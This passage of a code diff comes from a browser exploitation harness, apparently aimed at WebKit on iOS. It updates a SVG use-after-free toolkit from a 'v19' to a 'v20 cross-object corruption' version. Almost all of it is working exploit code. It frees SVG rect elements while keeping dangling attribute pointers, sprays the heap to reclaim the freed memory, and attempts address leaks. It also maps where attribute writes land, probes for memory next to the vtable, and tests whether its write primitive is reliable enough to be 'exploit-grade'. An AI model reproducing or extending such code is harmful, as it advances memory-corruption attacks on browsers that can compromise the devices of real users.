+      rx:     A.rx     ? A.rx.baseVal     : null,
+      ry:     A.ry     ? A.ry.baseVal     : null
+    };
+
+    A.remove();
     await micro();
 
-    // READ BACK via all dangling ptrs
-    const post={};
-    const gadgetResults=[];
-
-    for(const[name,g]of Object.entries(gadgets)){
-        let baseVal=null,animVal=null,unitType=null,writeOk=false,writeErr=null;
-        let strVal=null,rectBaseW=null,rectBaseH=null;
-        let isHit=false;
-
-        try{
-            if(g?.baseVal){
-                if(typeof g.baseVal.value==='number'){
-                    baseVal=g.baseVal.value;
-                    if(baseVal!==0)isHit=true;
-                    // Try write
-                    try{g.baseVal.value=7777;writeOk=g.baseVal.value===7777;}catch(ex){writeErr=ex.message.slice(0,30);}
-                }else if(typeof g.baseVal==='string'){
-                    strVal=g.baseVal;
-                    if(strVal!=='')isHit=true;
-                }else if(g.baseVal.width!==undefined){
-                    // SVGRect (viewBox)
-                    rectBaseW=g.baseVal.width;
-                    rectBaseH=g.baseVal.height;
-                    if(rectBaseW!==0||rectBaseH!==0)isHit=true;
-                }
-            }
-        }catch(ex){}
-
-        try{if(g?.animVal?.value!==undefined)animVal=g.animVal.value;}catch(e){}
-        try{unitType=g?.baseVal?.unitType;}catch(e){}
-
-        gadgetResults.push({name,baseVal,animVal,unitType,writeOk,writeErr,strVal,rectBaseW,rectBaseH,isHit});
-        const summary=`  [${isHit?'HIT':'---'}] ${name}: base=${baseVal??strVal??rectBaseW} anim=${animVal} unit=${unitType} write=${writeOk} wErr=${writeErr||'-'}`;
-        log(summary,isHit?'bad':'dim');
+    var names = ['width','height','x','y','rx','ry'];
+    for (var ni = 0; ni < names.length; ni++) {
+      var nm = names[ni];
+      try { if (g[nm]) g[nm].value = SENTINELS[nm]; } catch(e) {}
     }
 
-    const hits=gadgetResults.filter(r=>r.isHit).length;
-    log(`\n[*] VAR: ${hits}/${gadgetResults.length} gadgets hit`,(hits>0?'bad':'inf'));
-    log('[*] each hit = independent UAF read/write gadget','inf');
-    if(hits>1)log('[!!] multiple gadgets → can read/write different offsets in freed element','bad');
+    var B = mkRect(42, 42);
+    livesvg.appendChild(B);
+    await micro();
 
-    if(!q)dis(false);
-    return{hits,total:gadgetResults.length,gadgetResults};
+    var B_reads = {};
+    try { B_reads.w  = B.width  ? B.width.baseVal.value   : null; } catch(e) {}
+    try { B_reads.h  = B.height ? B.height.baseVal.value  : null; } catch(e) {}
+    try { B_reads.x  = B.x     ? B.x.baseVal.value        : null; } catch(e) {}
+    try { B_reads.y  = B.y     ? B.y.baseVal.value        : null; } catch(e) {}
+    try { B_reads.rx = B.rx    ? B.rx.baseVal.value       : null; } catch(e) {}
+    try { B_reads.bw = B.getBBox ? B.getBBox().width       : null; } catch(e) {}
+
+    var hits = [];
+    var keys = Object.keys(B_reads);
+    for (var ki = 0; ki < keys.length; ki++) {
+      var v = B_reads[keys[ki]];
+      if (sentVals.indexOf(v) !== -1) hits.push(keys[ki] + '=' + v);
+    }
+
+    if (hits.length > 0) {
+      vtpHit++;
+      log('  trial=' + trial + ': [SENTINEL IN B!] ' + hits.join(' '), 'bad');
+    } else {
+      if (trial < 3) log('  trial=' + trial + ': B=' + JSON.stringify(B_reads) + ' (no sentinel)', 'dim');
+    }
+
+    flush(); await raf();
+  }
+
+  log('[*] VTP: vtpHit=' + vtpHit, vtpHit > 0 ? 'bad' : 'inf');
+  if (!q) dis(false);
+  return { vtpHit: vtpHit };
 }
 
-// ── ADR: address leak attempt ─────────────────────────────────────────────
-async function runADR(q=false){
-    if(!q){dis(true);sep();log('▶ ADR: address leak — read raw freed heap bytes via animLen','inf');sep();}
-    log('[*] write sentinel float to attr before free → free → read back','inf');
-    log('[*] if value changes → heap overwritten = interesting raw memory','ok');
-    log('[*] spray Float64Array with ptr-shaped values → read via animLen','bad');
-    log('[*] any non-sentinel non-zero float = potential address bits','bad');log('');
+// OFS: offset map - cross-gadget interference
+async function runOFS(q) {
+  if (!q) { dis(true); sep(); log('OFS: offset map - cross-gadget write interference', 'inf'); sep(); }
+  log('[*] write via gadget X, read all others - shared reads = shared memory offset', 'ok');
 
-    const SENTINEL=9999.0;
-    const leaks=[];
-    let leakCount=0;
+  flush(); await raf(); await raf();
 
-    // Phase 1: write sentinel before free, read back after free + spray
-    for(let t=0;t<16;t++){
-        flush();await raf();await raf();
+  var A = mkRect(80, 60);
+  A.setAttribute('rx', '12');
+  A.setAttribute('ry', '7');
+  livesvg.appendChild(A);
+  await raf(); await raf();
 
-        const rect=mkRect(80);livesvg.appendChild(rect);await raf();
-        const animW=rect.width;
-        const bv=animW?.baseVal;
+  var gadgetNames = ['width','height','x','y','rx','ry'];
+  var gadgets = {
+    width:  A.width  ? A.width.baseVal  : null,
+    height: A.height ? A.height.baseVal : null,
+    x:      A.x      ? A.x.baseVal      : null,
+    y:      A.y      ? A.y.baseVal      : null,
+    rx:     A.rx     ? A.rx.baseVal     : null,
+    ry:     A.ry     ? A.ry.baseVal     : null
+  };
 
-        // Write sentinel INTO THE LIVE ELEMENT first
-        try{bv.value=SENTINEL;}catch(e){}
-        const confirmSentinel=bv?.value;
+  var preVals = {};
+  for (var pi = 0; pi < gadgetNames.length; pi++) {
+    var pn = gadgetNames[pi];
+    try { preVals[pn] = gadgets[pn] ? gadgets[pn].value : null; } catch(e) {}
+  }
+  log('  pre-free: ' + gadgetNames.map(function(k){ return k+'='+preVals[k]; }).join(' '), 'ok');
 
-        // FREE
-        rect.remove();
+  A.remove();
+  await micro();
 
-        // Immediately spray with Float64Array containing pseudo-pointer values
-        // arm64 heap addresses typically: 0x00000001xxxxxxxx range
-        // As double: these look like very specific float bit patterns
-        // We spray with a recognizable pattern: 1.0, 2.0, 3.0... so we know if heap has our data
-        const sprayVal=t*1000.0+0.5; // unique per iteration
-        const spray=[];
-        for(let i=0;i<256;i++){
-            const fa=new Float64Array(64);
-            fa.fill(sprayVal);
-            spray.push(fa);
-        }
+  var postVals = {};
+  for (var qi = 0; qi < gadgetNames.length; qi++) {
+    var qn = gadgetNames[qi];
+    try { postVals[qn] = gadgets[qn] ? gadgets[qn].value : null; } catch(e) {}
+  }
+  log('  post-free: ' + gadgetNames.map(function(k){ return k+'='+postVals[k]; }).join(' '), 'ok');
 
-        // Read via dangling ptr
-        let postV=null;
-        try{postV=bv?.value;}catch(e){}
+  var offsetMap = {};
+  var MAGIC_BASE = 111111.0;
 
-        // Is it the sentinel (no spray hit), the spray value (spray landed), or something else (raw heap)?
-        const isSentinel=Math.abs(postV-SENTINEL)<0.001;
-        const isSpray=Math.abs(postV-sprayVal)<0.001;
-        const isRawHeap=postV!==null&&!isSentinel&&!isSpray&&postV!==0;
+  log('  Cross-gadget interference map:', 'inf');
 
-        if(isRawHeap){
-            leakCount++;
-            leaks.push({t,sentinel:confirmSentinel,postV,sprayVal});
-            log(`  t${t}: [RAW HEAP] sentinel=${confirmSentinel} post=${postV} (≠sentinel, ≠spray=${sprayVal})`, 'bad');
-            log(`    raw bits: ${postV} → potential address data in freed heap`,'bad');
-        }else if(isSpray){
-            log(`  t${t}: [SPRAY HIT] sentinel=${confirmSentinel} post=${postV} ← spray landed!`,'bad');
-        }else if(isSentinel){
-            if(t<4)log(`  t${t}: sentinel=${confirmSentinel} post=${postV} (sentinel preserved in freed heap)`,'dim');
-        }else{
-            if(t<4)log(`  t${t}: sentinel=${confirmSentinel} post=${postV} (null/0)`,'dim');
-        }
+  for (var wi = 0; wi < gadgetNames.length; wi++) {
+    var writerName = gadgetNames[wi];
+    var writerBV = gadgets[writerName];
 
-        spray.length=0;
-        flush();await raf();
+    // reset all to pre values
+    for (var ri = 0; ri < gadgetNames.length; ri++) {
+      var rn = gadgetNames[ri];
+      try { if (gadgets[rn]) gadgets[rn].value = preVals[rn]; } catch(e) {}
     }
 
-    // Phase 2: read multiple attribute values from same freed element
-    // Different attribute offsets in the freed element may contain pointer-shaped data
-    {
-        flush();await raf();await raf();
-        const rect=mkRect(80,60);
-        rect.setAttribute('rx','12');rect.setAttribute('ry','7');
-        livesvg.appendChild(rect);await raf();
+    var MAGIC = MAGIC_BASE + wi * 1000;
+    try { if (writerBV) writerBV.value = MAGIC; } catch(e) {}
 
-        const attrs={
-            width:rect.width,height:rect.height,
-            x:rect.x,y:rect.y,
-            rx:rect.rx,ry:rect.ry
-        };
-        // Write distinct sentinels per attr
-        const sentinels={width:1111,height:2222,x:3333,y:4444,rx:5555,ry:6666};
-        for(const[name,g]of Object.entries(attrs)){
-            try{g.baseVal.value=sentinels[name];}catch(e){}
-        }
-
-        rect.remove();await micro();
-
-        log(`\n  multi-attr freed heap scan:`, 'inf');
-        for(const[name,g]of Object.entries(attrs)){
-            let v=null;try{v=g?.baseVal?.value;}catch(e){}
-            const expected=sentinels[name];
-            const tag=v===expected?'sentinel preserved':(v===0?'zeroed':v===null?'null':`RAW=${v}`);
-            const isRaw=v!==null&&v!==0&&v!==expected;
-            log(`    ${name}: sentinel=${expected} post=${v} → ${tag}`,isRaw?'bad':'dim');
-            if(isRaw)leakCount++;
-        }
-
-        flush();await raf();
+    var readbacks = {};
+    for (var rri = 0; rri < gadgetNames.length; rri++) {
+      var rrn = gadgetNames[rri];
+      try { readbacks[rrn] = gadgets[rrn] ? gadgets[rrn].value : null; } catch(e) {}
     }
 
-    log(`\n[*] ADR: leakCount=${leakCount}`,(leakCount>0?'bad':'inf'));
-    if(leakCount>0)log('[!!] raw heap data readable through freed element attr ptr!','bad');
-    else log('[*] freed heap preserves our sentinel values = clean free, no overwrite yet','ok');
-    log('[*] NOTE: on iOS ASLR all ptrs are randomized — raw float != useful addr without pivot','inf');
+    var shared = [];
+    for (var si = 0; si < gadgetNames.length; si++) {
+      var sn = gadgetNames[si];
+      var sv = readbacks[sn];
+      if (sv !== null && Math.abs(sv - MAGIC) < 0.01) shared.push(sn);
+    }
 
-    if(!q)dis(false);
-    return{leakCount,leaks};
+    offsetMap[writerName] = shared;
+    log('  write ' + writerName + '=' + MAGIC + ' -> shared: [' + shared.join(',') + ']', 'inf');
+  }
+
+  log('  Offset groups:', 'inf');
+  var seen = {};
+  var groups = [];
+  for (var gi = 0; gi < gadgetNames.length; gi++) {
+    var gk = gadgetNames[gi];
+    var gshared = offsetMap[gk];
+    if (!seen[gk] && gshared.length > 1) {
+      groups.push(gshared);
+      for (var gsi = 0; gsi < gshared.length; gsi++) seen[gshared[gsi]] = true;
+      log('  Group: [' + gshared.join(', ') + ']', 'bad');
+    }
+  }
+  if (groups.length === 0) {
+    log('  All gadgets write to distinct offsets - max write surface', 'ok');
+  }
+
+  flush(); await raf();
+  if (!q) dis(false);
+  return { offsetMap: offsetMap, groups: groups };
 }
 
-// ── RUN ALL ────────────────────────────────────────────────────────────────
-async function runAll(){
-    dis(true);clearLog();sep();
-    log('▶ SVG UAF v19 — AL exploitation harness','inf');sep();
-    log('[*] v18 AL: 24/24 animW_base=80 write=999 → raw UAF write on freed SVGElement','ok');
-    log('[*] v19 weaponizing: window size, heap spray, type confusion, gadget variants, addr leak','bad');log('');
+// CNF: confirm primitive - 100 iterations
+async function runCNF(q) {
+  if (!q) { dis(true); sep(); log('CNF: confirm primitive - 100 iterations reliability', 'inf'); sep(); }
+  log('[*] free A, write 4 distinct values via width/height/x/y gadgets, read back', 'ok');
 
-    const R={};
-    for(const[lbl,fn]of[
-        ['WIN_window_size',runWIN],
-        ['SPR_heap_spray',runSPR],
-        ['TYP_type_confusion',runTYP],
-        ['VAR_gadget_variants',runVAR],
-        ['ADR_addr_leak',runADR],
-    ]){
-        sep();log(`▶ ${lbl}`,'inf');sep();
-        try{R[lbl]=await fn(true);}catch(e){log(`[!] ${lbl}: ${e}`,'bad');R[lbl]=null;}
-        log('');
+  var confirmed = 0;
+  var ATTACK_VAL = 31337.0;
+
+  for (var t = 0; t < 100; t++) {
+    flush(); await raf();
+
+    var A = mkRect(80);
+    livesvg.appendChild(A);
+    await raf();
+
+    var bvW = A.width  ? A.width.baseVal  : null;
+    var bvH = A.height ? A.height.baseVal : null;
+    var bvX = A.x      ? A.x.baseVal      : null;
+    var bvY = A.y      ? A.y.baseVal      : null;
+
+    var preW = bvW ? bvW.value : null;
+
+    A.remove();
+
+    try { if (bvW) bvW.value = ATTACK_VAL;     } catch(e) {}
+    try { if (bvH) bvH.value = ATTACK_VAL + 1; } catch(e) {}
+    try { if (bvX) bvX.value = ATTACK_VAL + 2; } catch(e) {}
+    try { if (bvY) bvY.value = ATTACK_VAL + 3; } catch(e) {}
+
+    var rW = null, rH = null, rX = null, rY = null;
+    try { rW = bvW ? bvW.value : null; } catch(e) {}
+    try { rH = bvH ? bvH.value : null; } catch(e) {}
+    try { rX = bvX ? bvX.value : null; } catch(e) {}
+    try { rY = bvY ? bvY.value : null; } catch(e) {}
+
+    var ok = (rW === ATTACK_VAL) && (rH === ATTACK_VAL + 1) && (rX === ATTACK_VAL + 2) && (rY === ATTACK_VAL + 3);
+    if (ok) confirmed++;
+
+    if (t < 5 || !ok) {
+      log('  t' + t + ': pre=' + preW + ' wrote ' + ATTACK_VAL + '+ read(' + rW + ',' + rH + ',' + rX + ',' + rY + ') ' + (ok ? 'OK' : 'FAIL'), ok ? 'ok' : 'bad');
     }
+  }
 
-    sep();log('▶ SUMMARY v19 — exploitation primitives','inf');sep();
-    log('[*] WIN: window=0 → slot reclaimed immediately = need to race alloc timing','inf');
-    log('[*] WIN: window=big → slot stays readable for many allocs = VERY exploitable','inf');
-    log('[*] SPR: hit → controlled data in freed slot = heap grooming works','inf');
-    log('[*] TYP: confused → wrong type read through freed ptr = type confusion','inf');
-    log('[*] VAR: many hits → multiple read/write gadgets at different element offsets','inf');
-    log('[*] ADR: rawHeap > 0 → reading non-sentinel raw data = address bits in freed heap','inf');
+  log('[*] CNF: confirmed=' + confirmed + '/100', 'bad');
+  var pct = (confirmed / 100 * 100).toFixed(1);
+  log('[*] UAF write reliability: ' + pct + '%', confirmed >= 90 ? 'bad' : 'inf');
+  if (confirmed >= 90) {
+    log('[!!] exploit-grade primitive confirmed', 'bad');
+  }
 
-    for(const[lbl,r]of Object.entries(R)){
-        if(!r){log(`  ${lbl}: ERROR`,'bad');continue;}
-        const v=r.sprayHit??r.confused??r.hits??r.leakCount??'?';
-        log(`  ${lbl}: key=${v}`,v>0?'bad':'dim');
+  if (!q) dis(false);
+  return { confirmed: confirmed };
+}
+
+// RUN ALL
+async function runAll() {
+  dis(true); clearLog(); sep();
+  log('SVG UAF v20 - cross-object corruption harness', 'inf'); sep();
+
+  var results = {};
+  var tests = [
+    ['RUS_isoheap_reuse',    runRUS],
+    ['COR_live_corruption',  runCOR],
+    ['VTP_vtable_adjacent',  runVTP],
+    ['OFS_offset_map',       runOFS],
+    ['CNF_confirm_primitive',runCNF]
+  ];
+
+  for (var i = 0; i < tests.length; i++) {
+    var lbl = tests[i][0];
+    var fn  = tests[i][1];
+    sep();
+    log(lbl, 'inf');
+    sep();
+    try {
+      results[lbl] = await fn(true);
+    } catch(e) {
+      log('[!] ' + lbl + ': ' + e, 'bad');
+      results[lbl] = null;
     }
+    log('', '');
+  }
 
-    sep();dis(false);
+  sep();
+  log('SUMMARY v20', 'inf');
+  sep();
+
+  var keys = Object.keys(results);
+  for (var ki = 0; ki < keys.length; ki++) {
+    var k = keys[ki];
+    var r = results[k];
+    if (!r) { log('  ' + k + ': ERROR', 'bad'); continue; }
+    var v = r.reuse_at !== undefined ? r.reuse_at :
+            r.corruptionConfirmed !== undefined ? r.corruptionConfirmed :
+            r.vtpHit !== undefined ? r.vtpHit :
+            r.groups !== undefined ? r.groups.length :
+            r.confirmed !== undefined ? r.confirmed : '?';
+    var cls = (typeof v === 'number' && v > 0) || v === true ? 'bad' : 'dim';
+    log('  ' + k + ': key=' + v, cls);
+  }
+  sep();
+  dis(false);
 }
 </script>
 </body>
